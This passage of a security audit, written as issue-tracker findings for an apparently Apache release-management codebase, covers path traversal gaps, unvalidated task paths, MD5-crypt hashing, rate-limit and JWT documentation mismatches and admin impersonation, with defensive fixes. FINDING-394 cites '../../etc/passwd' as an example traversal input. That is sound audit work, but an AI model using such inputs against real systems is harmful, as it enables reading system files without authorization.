Apply similar fix to both `_download_or_list()` and `selected_path()` functions.

### Acceptance Criteria
- [ ] Add resolve() + is_relative_to() check to _download_or_list()
- [ ] Add resolve() + is_relative_to() check to selected_path()
- [ ] Verify path traversal attempts are blocked
- [ ] Unit tests for containment validation

### References
- Source reports: L1:5.3.2.md
- ASVS sections: 5.3.2
- CWE: CWE-22

### Priority
Low

---

## Issue: FINDING-392 - SBOM Task Handlers Use Unvalidated Path Strings from Database

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
SBOM task handlers accept path arguments as plain strings without re-validation at the worker boundary. While all current code paths creating these tasks validate inputs through safe.RelPath before storage, the worker process does not re-apply validation when deserializing task arguments from the database. This creates a defense-in-depth gap at the web server/worker boundary.

### Details
In `atr/tasks/sbom.py`:
- Lines 85-92: FileArgs model accepts file_path as plain str without validation
- Line 120: Task handler uses unvalidated paths
- Line 170: Task handler uses unvalidated paths  
- Line 200: Task handler uses unvalidated paths

The FileArgs model accepts file_path as plain str without validation, creating a TOCTOU gap where database contents could be tampered with between task creation and execution.

### Recommended Remediation
Add Pydantic field validators to FileArgs model:

```python
class FileArgs(pydantic.BaseModel):
    project_key: str
    version_key: str
    revision_number: int
    file_path: str
    
    @pydantic.field_validator('file_path')
    @classmethod
    def validate_file_path(cls, v: str) -> str:
        safe.RelPath(v)  # Raises if invalid
        return v
    
    @pydantic.field_validator('project_key')
    @classmethod
    def validate_project_key(cls, v: str) -> str:
        safe.ProjectKey(v)
        return v
    
    # Similar validators for version_key, revision_number
```

Alternatively, add usage-point validation with containment check in each handler function.

### Acceptance Criteria
- [ ] Add Pydantic validators to FileArgs model
- [ ] Add validators for all path-related fields
- [ ] Unit tests for validator edge cases
- [ ] Verify invalid paths raise exceptions at deserialization

### References
- Source reports: L1:5.3.2.md
- Related findings: FINDING-393
- ASVS sections: 5.3.2
- CWE: CWE-22

### Priority
Low

---

## Issue: FINDING-393 - CycloneDX Generation Handler Uses Unvalidated Absolute Paths

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The CycloneDX generation task handler accepts absolute paths as plain strings without validation at the worker boundary. While paths are constructed from validated inputs and resolved at task creation time, the worker does not verify that deserialized paths remain within expected directories. The GenerateCycloneDX model accepts artifact_path and output_path as absolute path strings without validation, allowing arbitrary file read (via extraction) and write operations if task arguments are tampered with.

### Details
In `atr/tasks/sbom.py` at lines 260-340, the CycloneDX generation handler accepts and uses absolute paths without containment validation.

### Recommended Remediation
Add containment validation in _generate_cyclonedx_core():

```python
def _generate_cyclonedx_core(artifact_path: str, output_path: str, ...):
    unfinished_dir = paths.get_unfinished_dir().resolve()
    
    resolved_artifact = pathlib.Path(artifact_path).resolve()
    resolved_output = pathlib.Path(output_path).resolve()
    
    # Verify containment
    if not resolved_artifact.is_relative_to(unfinished_dir):
        raise SBOMGenerationError(
            f"Artifact path escapes unfinished directory: {artifact_path}"
        )
    
    if not resolved_output.is_relative_to(unfinished_dir):
        raise SBOMGenerationError(
            f"Output path escapes unfinished directory: {output_path}"
        )
    
    # Verify files exist and are regular files
    if not resolved_artifact.is_file():
        raise SBOMGenerationError(f"Artifact not found: {artifact_path}")
    
    # ... continue with generation ...
```

### Acceptance Criteria
- [ ] Add containment validation for artifact_path
- [ ] Add containment validation for output_path
- [ ] Verify files exist and are regular files
- [ ] Unit tests for path validation edge cases

### References
- Source reports: L1:5.3.2.md
- Related findings: FINDING-392
- ASVS sections: 5.3.2
- CWE: CWE-22

### Priority
Low

---

## Issue: FINDING-394 - Unvalidated file_name Parameter in Path Construction Utility

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The `revision_path_for_file()` utility function accepts an unvalidated `file_name: str` parameter and directly appends it to a path. While no current callers pass user-controlled input, the function signature does not indicate that validation is the caller's responsibility, creating a latent security risk. If future code passes user input as file_name (e.g., ../../etc/passwd), path traversal would occur without any validation.

### Details
In `atr/paths.py` at approximately line 101, the function signature accepts `file_name: str` without validation:

```python
def revision_path_for_file(
    project_key: safe.ProjectKey, 
    version_key: safe.VersionKey, 
    revision: safe.RevisionNumber, 
    file_name: str  # Unvalidated!
) -> pathlib.Path:
    return base_path_for_revision(project_key, version_key, revision) / file_name
```

### Recommended Remediation
Change function signature to accept safe.RelPath instead of str:

```python
def revision_path_for_file(
    project_key: safe.ProjectKey,
    version_key: safe.VersionKey,
    revision: safe.RevisionNumber,
    file_name: safe.RelPath  # Now validated
) -> pathlib.Path:
    return base_path_for_revision(project_key, version_key, revision) / file_name.as_path()
```

Update all callers to pass safe.RelPath instances.

### Acceptance Criteria
- [ ] Change file_name parameter type to safe.RelPath
- [ ] Update all callers to pass safe.RelPath instances
- [ ] Verify path traversal attempts are rejected
- [ ] Unit tests for validation

### References
- Source reports: L1:5.3.2.md
- ASVS sections: 5.3.2
- CWE: CWE-22

### Priority
Low

---

## Issue: FINDING-395 - SVN PubSub Path Construction Missing Traversal Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The SVN PubSub handler constructs local filesystem paths from repository paths provided in commit notifications without explicit path traversal validation. While SVN itself prevents .. in repository paths and the PubSub connection is authenticated, a defense-in-depth check is missing. If PubSub infrastructure is compromised or SVN path validation is bypassed, arbitrary svn update commands could be executed outside the intended working copy directory.

### Details
In `atr/svn/pubsub.py` at lines 97-108, local paths are constructed from repository paths without containment validation.

### Recommended Remediation
Add containment validation after path construction:

```python
async def _handle_commit(self, repo_path: str):
    # ... construct local_path ...
    local_path = (self.working_copy_root / relative_part).resolve()
    
    # Verify containment
    if not local_path.is_relative_to(self.working_copy_root.resolve()):
        log.warning(
            'PubSub path escapes working copy root',
            extra={
                'repo_path': repo_path,
                'local_path': str(local_path)
            }
        )
        return  # Skip this update
    
    # Add try/except around svn.update()
    try:
        await svn.update(local_path)
    except Exception as e:
        log.error('SVN update failed', extra={'path': str(local_path), 'error': str(e)})
```

### Acceptance Criteria
- [ ] Add containment validation after path construction
- [ ] Add error handling around svn.update()
- [ ] Log containment violations
- [ ] Unit tests for path traversal attempts

### References
- Source reports: L1:5.3.2.md
- ASVS sections: 5.3.2
- CWE: CWE-22

### Priority
Low

---

## Issue: FINDING-396 - total_size() Function Defined But Never Called Before Extraction

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `total_size()` function in archives.py (lines 77-85) computes total uncompressed size of an archive by iterating all members and reading through all file content via fileobj.read(chunk_size), performing decompression without writing to disk. This function exists as a utility that could serve as a pre-extraction check, but no code in the codebase calls it before extract() or any other extraction operation.

### Details
The function's mere existence may create false confidence that pre-extraction size checking is implemented, when in fact it is not being used. This could lead to decompression bombs (zip bombs) not being caught before extraction begins.

### Recommended Remediation
Either:

**Option 1:** Call total_size() before extract() at every call site to provide pre-extraction size validation:

```python
async def extract_archive(archive_path: pathlib.Path, dest: pathlib.Path):
    # Check total size before extraction
    total = await total_size(archive_path)
    MAX_EXTRACTION_SIZE = 10 * 1024 * 1024 * 1024  # 10GB
    if total > MAX_EXTRACTION_SIZE:
        raise ValueError(f"Archive too large: {total} bytes")
    
    # Proceed with extraction
    await extract(archive_path, dest)
```

**Option 2:** Integrate size checking directly into the pre-extraction safety check (as recommended in FILE-014) and remove or deprecate this unused function to reduce confusion.

### Acceptance Criteria
- [ ] Either implement total_size() calls before extractions
- [ ] Or integrate size checking into extract() function
- [ ] Or remove unused function with documentation
- [ ] Unit tests for size limit enforcement

### References
- Source reports: L2:5.2.3.md
- Related findings: FINDING-203
- ASVS sections: 5.2.3

### Priority
Low

---

## Issue: FINDING-397 - Documentation Claims Rate Limits on Some /api/distribute/* Endpoints That Are Not Implemented

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
Documentation claims all /api/distribute/* endpoints have 10/hr rate limits, but two endpoints lack the decorator: `distribution_record_from_workflow` and `update_distribution_task_status`. This documentation inaccuracy undermines audit confidence. Endpoints are more permissive (500/hr) than documented (10/hr). However, practical exploitation requires GitHub Actions compromise since both endpoints require Trusted Publisher JWT authentication (GitHub Actions OIDC tokens).

### Details
In `atr/api/__init__.py`, the `distribution_record_from_workflow` and `update_distribution_task_status` functions lack the `@rate_limiter.rate_limit(10, datetime.timedelta(hours=1))` decorator that documentation claims applies to all /api/distribute/* endpoints.

Documentation in `security/ASVS/audit_guidance/authentication-security.md` claims uniform rate limiting that does not match implementation.

### Recommended Remediation
**Option A (Fix code):** Add `@rate_limiter.rate_limit(10, datetime.timedelta(hours=1))` decorator to both functions:

```python
@app.route("/api/distribute/workflow", methods=["POST"])
@rate_limiter.rate_limit(10, datetime.timedelta(hours=1))
async def distribution_record_from_workflow():
    ...

@app.route("/api/distribute/task/status", methods=["POST"])
@rate_limiter.rate_limit(10, datetime.timedelta(hours=1))
async def update_distribution_task_status():
    ...
```

**Option B (Fix documentation):** Update documentation to specify which /api/distribute/* endpoints have the 10/hr limit versus API-wide 500/hr limit, explaining that other endpoints use API-wide rate limit due to Trusted Publisher JWT authentication requirements.

### Acceptance Criteria
- [ ] Either add rate limit decorators or update documentation
- [ ] Verify rate limits are enforced as documented
- [ ] Unit tests for rate limit enforcement

### References
- Source reports: L1:6.1.1.md
- ASVS sections: 6.1.1

### Priority
Low

---

## Issue: FINDING-398 - Documentation Does Not Describe Failed Authentication Monitoring and Alerting

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
While the code includes authentication failure logging (log.warning, log.failed_authentication with structured metadata), the documentation does not describe how these logs are monitored, what alerting thresholds exist, or how operators should respond to attack patterns. Operations teams cannot determine proper monitoring configuration from documentation alone, and security events may go undetected without documented alerting thresholds.

### Details
In `atr/storage/writers/tokens.py` at lines 105-116, logging occurs in `issue_jwt()` but there is no corresponding documentation in `security/ASVS/audit_guidance/authentication-security.md` describing monitoring and alerting procedures.

### Recommended Remediation
Add a 'Monitoring and Detection' section to authentication-security.md documenting:

```markdown
## Monitoring and Detection

### Authentication Failure Logging
All authentication failures are logged with structured metadata:
- Failure reason (invalid_token, expired_token, account_disabled, etc.)
- ASF user ID (asf_uid)
- Remote IP address (remote_addr)
- Timestamp

### Log Locations
- Application logs: /var/log/atr/authentication.log
- System logs: journalctl -u atr-web

### Recommended Monitoring Thresholds
1. Sustained rate limit violations: >10 HTTP 429 responses from single IP in 1 hour
2. Failed PAT validations: >5 for single user in 1 hour
3. Account status failures: Any occurrence (may indicate LDAP issues)
4. SSH authentication failures: >20 from single IP in 10 minutes

### Incident Response Procedures
For sustained authentication failures:
1. Identify attack pattern in logs
2. Verify legitimate vs. malicious traffic
3. Consider temporary IP blocking at proxy level
4. Review account status for affected users
```

### Acceptance Criteria
- [ ] Add Monitoring and Detection section to documentation
- [ ] Document log locations and structure
- [ ] Define alerting thresholds
- [ ] Document incident response procedures

### References
- Source reports: L1:6.1.1.md
- Related findings: ASVS-611-MED-002
- ASVS sections: 6.1.1

### Priority
Low

---

## Issue: FINDING-399 - LDAP Admin Library Lacks Password Change Function

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The committer class provides administrative methods (add_project, remove_pmc, rename, etc.) but no change_password() method. The manager.create_account() method (line 223) generates passwords during account creation, but no corresponding update function exists. Even administrators using this library cannot programmatically change a user's LDAP password, limiting operational capability for password resets and account recovery.

### Details
In `asfpy/ldapadmin.py`:
- Lines 108-175: committer class with various admin methods
- Line 223: Password generation in create_account()
- No change_password() method exists

### Recommended Remediation
Add change_password() method to committer class:

```python
class committer:
    def change_password(self, new_password: str) -> None:
        """Change the user's LDAP password.
        
        Args:
            new_password: The new password to set
        """
        import passlib.hash
        
        # Generate bcrypt hash with 12 rounds
        password_hash = passlib.hash.bcrypt.using(rounds=12).hash(new_password)
        
        # Apply LDAP MOD_REPLACE operation
        mod_list = [(ldap.MOD_REPLACE, 'userPassword', [f'{{CRYPT}}{password_hash}'.encode()])]
        
        self.ldap_connection.modify_s(self.dn, mod_list)
```

### Acceptance Criteria
- [ ] Add change_password() method to committer class
- [ ] Use bcrypt with 12 rounds for password hashing
- [ ] Apply LDAP MOD_REPLACE operation correctly
- [ ] Unit tests for password change functionality

### References
- Source reports: L1:6.2.2.md
- Related findings: ASVS-622-MED-001, ASVS-622-INFO-001
- ASVS sections: 6.2.2

### Priority
Low

---

## Issue: FINDING-400 - No Evidence of PAT Lifecycle Management Testing

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
Personal Access Tokens (PATs) function as credential equivalents for API authentication. While PAT generation uses strong cryptography (secrets.token_urlsafe, 256-bit), no tests verify that users can revoke or rotate their PATs. PAT system is referenced in code inventory and bearer token authentication exists in src/asfquart/session.py, but no test file among 15+ provided tests validates PAT revocation or rotation.

### Details
Users may be unable to revoke compromised PATs if functionality is absent or broken. PATs are long-lived credentials (180 days) that require lifecycle management per ASVS 6.2.2 principles.

Test files reviewed include `tests/unit/test_user.py` but no PAT lifecycle tests exist.

### Recommended Remediation
Add comprehensive test coverage for PAT lifecycle management:

```python
# tests/unit/test_pat.py

async def test_user_can_revoke_pat():
    """Verify PAT revocation functionality."""
    # Create PAT
    pat = await create_pat(user_id, label="test-token")
    
    # Verify PAT works
    response = await api_call_with_pat(pat)
    assert response.status_code == 200
    
    # Revoke PAT
    await revoke_pat(user_id, pat.id)
    
    # Verify PAT no longer works
    response = await api_call_with_pat(pat)
    assert response.status_code == 401

async def test_user_can_rotate_pat():
    """Verify PAT rotation functionality."""
    # Create original PAT
    old_pat = await create_pat(user_id, label="test-token")
    
    # Rotate to new PAT
    new_pat = await rotate_pat(user_id, old_pat.id, label="test-token-rotated")
    
    # Verify old PAT revoked
    response = await api_call_with_pat(old_pat)
    assert response.status_code == 401
    
    # Verify new PAT works
    response = await api_call_with_pat(new_pat)
    assert response.status_code == 200

async def test_user_can_list_pats():
    """Verify users can view their active PATs."""
    # Create multiple PATs
    pat1 = await create_pat(user_id, label="token-1")
    pat2 = await create_pat(user_id, label="token-2")
    
    # List PATs
    pats = await list_user_pats(user_id)
    
    assert len(pats) == 2
    assert {p.id for p in pats} == {pat1.id, pat2.id}
```

### Acceptance Criteria
- [ ] Add test_user_can_revoke_pat()
- [ ] Add test_user_can_rotate_pat()
- [ ] Add test_user_can_list_pats()
- [ ] All PAT lifecycle tests pass

### References
- Source reports: L1:6.2.2.md
- ASVS sections: 6.2.2

### Priority
Low

---

## Issue: FINDING-401 - MD5-crypt Used for Password Hashing in Account Creation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The account creation function uses `md5_crypt` for password hashing, which is a deprecated algorithm. While this occurs during initial account creation (not a password change flow), it establishes a weak cryptographic foundation. NIST SP 800-63B Section 5.1.1.2 recommends modern password hashing algorithms (bcrypt, scrypt, Argon2, PBKDF2-SHA256). MD5-crypt is significantly faster to brute-force than modern alternatives, with approximately 200M hashes/second on modern GPUs compared to 50K for bcrypt.

### Details
In `asfpy/ldapadmin.py` at line 278, the account creation uses md5_crypt for password hashing.

### Recommended Remediation
Replace MD5-crypt with SHA-512-crypt (minimum) or bcrypt (recommended):

**For SHA-512-crypt:**
```python
import passlib.hash

password_hash = passlib.hash.sha512_crypt.using(
    rounds=656000, 
    salt=salt
).hash(password)
```
This aligns with NIST recommended minimum of 656,000 rounds.

**For bcrypt (preferred if LDAP supports):**
```python
import passlib.hash

password_hash = passlib.hash.bcrypt.using(
    rounds=12, 
    ident='2b'
).hash(password)
```

After implementation, test LDAP server compatibility with new hash format.

### Acceptance Criteria
- [ ] Replace md5_crypt with SHA-512-crypt or bcrypt
- [ ] Test LDAP server compatibility with new hash format
- [ ] Verify authentication works with new hashes
- [ ] Unit tests for password hashing

### References
- Source reports: L1:6.2.3.md
- Related findings: ASVS-623-MED-001
- ASVS sections: 6.2

### Priority
Low

---

## Issue: FINDING-402 - JWT TTL Documentation Discrepancy

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The security documentation states that JWTs have a 90-minute validity period, but the actual implementation uses a 30-minute TTL. The implemented value is more secure (shorter exposure window), but the discrepancy indicates documentation drift. Users/operators relying on documentation may incorrectly plan token refresh intervals, and the discrepancy indicates other documented values should be verified.

### Details
- Documentation: `atr/docs/authentication-security.md` claims "Validity: 90 minutes from creation"
- Implementation: `atr/jwtoken.py` line 48 defines `_ATR_JWT_TTL = 30 * 60` (30 minutes)

### Recommended Remediation
Update `atr/docs/authentication-security.md` to reflect the actual 30-minute TTL instead of the documented 90 minutes:

```markdown
* **Validity**: 30 minutes from creation
```

Also update the lifecycle diagram:
```markdown
└──▶ JWT Exchange ──▶ JWT (30 min)
```

### Acceptance Criteria
- [ ] Update documentation to reflect 30-minute TTL
- [ ] Search for any other references to "90 min" or "90 minutes"
- [ ] Update all JWT validity period references
- [ ] Verify consistency between code and documentation

### References
- Source reports: L1:6.3.1.md
- ASVS sections: 6.3.1

### Priority
Low

---

## Issue: FINDING-403 - Authentication Failure Logging Is Passive — No Blocking Integration

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The `failed_authentication()` function is called from multiple locations when authentication fails. While logging is valuable for monitoring, the function is purely passive and does not integrate with any blocking mechanism. Failed authentication attempts are logged for post-hoc analysis only and cannot trigger real-time protective actions (e.g., temporary IP blocking, account lockout).

### Details
In `atr/log.py` at lines 108-112, the `failed_authentication()` function only logs events. It is called from:
- `atr/jwtoken.py`: JWT validation failures
- `atr/ssh.py`: SSH authentication failures
- `atr/storage/writers/tokens.py`: PAT validation failures

Limitations:
- Cannot trigger real-time protective actions
- Security monitoring requires manual log analysis or external SIEM integration
- No automated response to brute force patterns

### Recommended Remediation
Integrate failure logging with an active blocking mechanism:

```python
# atr/log.py
async def failed_authentication(reason: str, identifier: str = None, **kwargs):
    """Log authentication failure and check for abuse patterns.
    
    Args:
        reason: Failure reason code
        identifier: IP address, username, or other identifier
        **kwargs: Additional structured logging data
    """
    # Log the failure
    logger.warning('authentication_failed', extra={'reason': reason, **kwargs})
    
    if identifier:
        # Increment failure counter
        count = await _increment_failure_counter(identifier)
        
        # Check threshold
        if await _check_threshold(identifier, count):
            await _trigger_temporary_block(identifier)
            logger.warning(
                'authentication_threshold_exceeded',
                extra={'identifier': identifier, 'count': count}
            )

async def _increment_failure_counter(identifier: str) -> int:
    """Increment failure counter in Redis/cache."""
    # Implementation using Redis INCR with expiry
    pass

async def _check_threshold(identifier: str, count: int) -> bool:
    """Check if failure threshold exceeded."""
    return count > 10  # Configurable threshold

async def _trigger_temporary_block(identifier: str):
    """Trigger temporary block via rate limiter or firewall."""
    # Implementation - could integrate with rate limiter or WAF
    pass
```

### Acceptance Criteria
- [ ] Integrate failed_authentication() with blocking mechanism
- [ ] Implement failure counter with Redis/cache backend
- [ ] Configure threshold for temporary blocks
- [ ] Add monitoring for threshold violations
- [ ] Unit tests for blocking logic

### References
- Source reports: L1:6.3.1.md
- Related findings: ASVS-631-HIGH-001, ASVS-631-MED-003
- ASVS sections: 6.3.1
- CWE: CWE-778

### Priority
Low

---

## Issue: FINDING-404 - Hardcoded "test" and "tooling" Default Committees in Automated Release Signing

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The `automated_release_signing_committees()` function in atr/db/interaction.py contains hardcoded "test" and "tooling" committee names that are always added to the authorized committee list, regardless of environment mode. These are not gated behind ALLOW_TESTS checks. If a project with committee key "test" or "tooling" exists in the production database, it would be authorized for automated GitHub Actions-based releases, bypassing database-driven policy for these committee names.

### Details
While practical risk is limited due to additional requirements (valid GitHub OIDC JWTs, matching workflow policies, proper committee configuration), the presence of default committee names in production violates the principle of least privilege and ASVS 6.3.2.

### Recommended Remediation
Gate the hardcoded "test" and "tooling" committee additions behind config.get().ALLOW_TESTS check:

```python
def automated_release_signing_committees() -> set[str]:
    """Return set of committee keys authorized for automated release signing."""
    committees = set()
    
    # Add committees from database
    for committee in db_query_authorized_committees():
        committees.add(committee.key)
    
    # Add test committees only in debug mode
    if config.get().ALLOW_TESTS:
        committees.add("test")
        committees.add("tooling")
    
    return committees
```

**Alternative approach:** Use configuration-based test committees via TEST_COMMITTEES environment variable (default empty string) and parse comma-separated values.

### Acceptance Criteria
- [ ] Gate "test" and "tooling" behind ALLOW_TESTS check
- [ ] Verify automated release tests pass in debug mode
- [ ] Confirm production deployments exclude "test"/"tooling"
- [ ] Add integration test to verify behavior in both Debug and Production modes

### References
- Source reports: L1:6.3.2.md
- Related findings: ASVS-632-MED-001
- ASVS sections: 6.3.2
- CWE: CWE-1188

### Priority
Low

---

## Issue: FINDING-405 - JWT TTL Documentation Inconsistency

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The documentation claims JWT tokens have a 90-minute validity period, while the actual implementation enforces a 30-minute TTL. This creates a discrepancy between documented and actual security behavior. Documentation-based security decisions may be based on incorrect TTL assumptions, which could lead to confusion during incident response, may cause operational issues if teams plan around 90-minute windows, and creates audit trail inconsistencies.

### Details
- Documentation: `atr/docs/authentication-security.md` references "90 minutes" in multiple locations
- Implementation: `atr/jwtoken.py` line 47 defines `_ATR_JWT_TTL = 30 * 60`

While the actual TTL (30 minutes) is more secure than documented, the inconsistency erodes trust in documentation accuracy.

### Recommended Remediation
Update documentation to reflect actual implementation:

```markdown
# In atr/docs/authentication-security.md, update to:
* **Validity**: 30 minutes from creation

# And in the lifecycle diagram:
└──▶ JWT Exchange ──▶ JWT (30 min)
```

**Verification Steps:**
1. Search all documentation files for "90 min" or "90 minutes" references to JWT
2. Update all occurrences to "30 min" or "30 minutes"
3. Add a documentation review step to CI/CD that validates security-critical parameters match code constants
4. Consider extracting TTL values from code comments/docstrings to ensure single source of truth

### Acceptance Criteria
- [ ] Update all "90 minutes" references to "30 minutes"
- [ ] Search documentation for any remaining TTL inconsistencies
- [ ] Consider adding CI check for documentation/code consistency
- [ ] Verify lifecycle diagrams reflect correct TTL

### References
- Source reports: L1:6.4.1.md
- ASVS sections: 6.4.1

### Priority
Low

---

## Issue: FINDING-406 - No Documentation of Password Policy Delegation Boundary

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The authentication documentation clearly explains that ATR is not an OAuth Authorization Server and correctly scopes ASVS applicability, but does not address which party is responsible for password quality controls, including ASVS 6.1.2's context-specific banned word list. Without explicit documentation of the password policy responsibility boundary, security auditors cannot determine whether ASVS password requirements are covered by ATR, by ASF OAuth, or are a gap.

### Details
While delegation to ASF OAuth is acknowledged for authentication, there is no equivalent statement for password policy. The documentation lacks:
- Mention of who enforces password complexity
- Who maintains banned word lists
- Reference to ASF password policy documentation

### Recommended Remediation
Add a subsection to the 'OAuth architecture and security responsibilities' section documenting password policy delegation:

```markdown
### Password Policy Delegation

Password creation, storage, and validation are entirely managed by the ASF OAuth service at oauth.apache.org. ATR does not accept, store, or validate user passwords.

**ASVS Password Requirements Delegation:**
- Password quality requirements (ASVS 2.1.x) are the responsibility of the ASF OAuth service
- Authentication documentation requirements (ASVS 6.1.x) are the responsibility of the ASF OAuth service
- ATR maintains a context-specific banned word list for reference since ATR is the authoritative source for project and committee names
- For ASF password policy details, see: [link to ASF OAuth documentation]

**ATR's Limited Password Scope:**
ATR generates temporary passwords for initial account creation in LDAP (via asfpy.ldapadmin), but these are immediately reset through ASF OAuth during first login.
```

### Acceptance Criteria
- [ ] Add password policy delegation section to documentation
- [ ] Document that ATR does not validate passwords
- [ ] Clarify ASVS responsibility boundary
- [ ] Reference ASF OAuth service for password policy
- [ ] Note ATR's context-specific banned word list

### References
- Source reports: L2:6.1.2.md
- Related findings: ASVS-612-MED-001
- ASVS sections: 6.1.2

### Priority
Low

---

## Issue: FINDING-407 - Inconsistent Rate Limiting Across GitHub OIDC Endpoints

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Five trusted publisher endpoints lack endpoint-specific rate limiting (distribution_record_from_workflow, publisher_distribution_record, publisher_release_announce, publisher_vote_resolve, update_distribution_task_status) while two similar endpoints have 10/hour rate limits (distribute_ssh_register, publisher_ssh_register). All endpoints are subject to global rate limiting (100/min, 1000/hr), but this inconsistency creates an uneven security posture.

### Details
In `atr/api/__init__.py`, the following endpoints lack `@rate_limiter.rate_limit(10, datetime.timedelta(hours=1))` decorator:
- distribution_record_from_workflow
- publisher_distribution_record
- publisher_release_announce
- publisher_vote_resolve
- update_distribution_task_status

An attacker with a valid GitHub OIDC token could make unlimited calls to the unprotected endpoints subject only to global rate limits.

### Recommended Remediation
Apply consistent rate limiting to all GitHub OIDC endpoints:

```python
@app.route("/api/distribute/workflow", methods=["POST"])
@rate_limiter.rate_limit(10, datetime.timedelta(hours=1))
async def distribution_record_from_workflow():
    ...

@app.route("/api/publisher/distribution", methods=["POST"])
@rate_limiter.rate_limit(10, datetime.timedelta(hours=1))
async def publisher_distribution_record():
    ...

@app.route("/api/publisher/announce", methods=["POST"])
@rate_limiter.rate_limit(10, datetime.timedelta(hours=1))
async def publisher_release_announce():
    ...

@app.route("/api/publisher/vote/resolve", methods=["POST"])
@rate_limiter.rate_limit(10, datetime.timedelta(hours=1))
async def publisher_vote_resolve():
    ...

@app.route("/api/distribute/task/status", methods=["POST"])
@rate_limiter.rate_limit(10, datetime.timedelta(hours=1))
async def update_distribution_task_status():
    ...
```

### Acceptance Criteria
- [ ] Add rate limit decorator to all five endpoints
- [ ] Verify 10/hour limit is enforced
- [ ] Test rate limit with valid GitHub OIDC token
- [ ] Unit tests for rate limit enforcement

### References
- Source reports: L2:6.1.3.md
- ASVS sections: 6.1.3
- CWE: CWE-770

### Priority
Low

---

## Issue: FINDING-408 - Admin Impersonation Not Documented as Authentication Pathway Variant

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The admin 'Browse as' feature creates a new session with a different user's identity (effectively creating an authentication session for user B while admin A is the actual operator). While the mechanism is secure with proper controls (admin authentication required, LDAP verification of target user, audit trail via metadata.admin, session isolation), it is not documented in authentication documentation.

### Details
In `atr/admin/__init__.py` at lines 96-136, the browse_as functionality is implemented but not documented in `atr/docs/authentication-security.md`.

This pathway has unique characteristics:
- Creates sessions for users who haven't authenticated
- Tracks original operator in metadata
- Used for support and debugging

### Recommended Remediation
Add 'Admin Impersonation (Browse As)' section to authentication-security.md:

```markdown
## Admin Impersonation (Browse As)

### Mechanism Overview
Administrators can use the "Browse as" feature to create sessions for other users for support and debugging purposes. This creates an authenticated session for the target user while tracking the original admin operator.

### Security Controls
1. **Admin-only access**: Requires administrator authentication and authorization
2. **LDAP verification**: Target user must exist and be active in LDAP
3. **Metadata tracking**: Original admin identity stored in session.metadata.admin
4. **Session isolation**: Impersonated session is independent of admin's session
5. **Audit trail**: All actions logged with both admin and impersonated user identities

### Use Cases
- Debugging user-reported permission issues
- Verifying user-specific functionality
- Testing project-specific access controls
- Support troubleshooting

### Limitations
- Impersonated session inherits admin's MFA status
- No separate audit log for browse-as sessions (tracked via metadata)
- Admin can perform any action the target user could perform
```

### Acceptance Criteria
- [ ] Add Admin Impersonation section to authentication documentation
- [ ] Document mechanism and security controls
- [ ] Document use cases and limitations
- [ ] Include audit trail information

### References
- Source reports: L2:6.1.3.md
- ASVS sections: 6.1.3
- CWE: CWE-1059

### Priority
Low

---

## Issue: FINDING-409 - vote_tabulate Authentication Identity Ignored

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `vote_tabulate` endpoint validates JWT authentication (@jwtoken.require) but never extracts or uses the authenticated identity for authorization. The operation runs at GeneralPublic privilege level. While the actual operation (cache lookup and vote tabulation) is low-risk read-only, this pattern creates false confidence: the endpoint appears authenticated but authorization is not enforced, and any valid JWT can tabulate any project's vote.

### Details
In `atr/api/__init__.py` at lines 676-713, the vote_tabulate function has JWT authentication but commented-out identity extraction (`asf_uid = _jwt_asf_uid()` is commented), and uses `storage.write_as_general_public()`.

### Recommended Remediation
Choose one of three options:

**Option 1 (Restore authorization):**
```python
@app.route("/api/vote/tabulate", methods=["POST"])
@jwtoken.require
async def vote_tabulate():
    asf_uid = _jwt_asf_uid()  # Uncomment
    async with storage.write(asf_uid) as write:
        # Use proper authorization level
        await write.as_foundation_committer(asf_uid).tabulate_vote(...)
```

**Option 2 (Document intentional design):**
Add comment explaining that authentication is required to prevent abuse but operation intentionally runs at GeneralPublic level since vote results are public.

**Option 3 (Remove authentication if not needed):**
If authentication serves no purpose, remove `@jwtoken.require` decorator.

### Acceptance Criteria
- [ ] Choose and implement one of the three options
- [ ] If restoring authorization, verify project access checks
- [ ] If documenting, add clear comments explaining design
- [ ] Unit tests for chosen approach

### References
- Source reports: L2:6.1.3.md
- ASVS sections: 6.1.3
- CWE: CWE-862

### Priority
Low

---

## Issue: FINDING-410 - Admin Session Impersonation Preserves But Does Not Require MFA

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `browse_as_post()` admin session impersonation function correctly preserves the MFA flag from the admin's session (mfa=current_session.mfa), preventing MFA downgrade during impersonation. However, since admin sessions themselves are not required to have MFA per ASVS-633-CRIT-002, this preservation is currently meaningless as mfa=False is simply copied through. This is actually a positive security pattern that will function correctly once ASVS-633-CRIT-002 is remediated.

### Details
In `atr/admin/__init__.py` at lines 121-155, the browse_as_post() function preserves MFA status but does not enforce it.

No vulnerability exists in this code itself. This is a dependency on another finding.

### Recommended Remediation
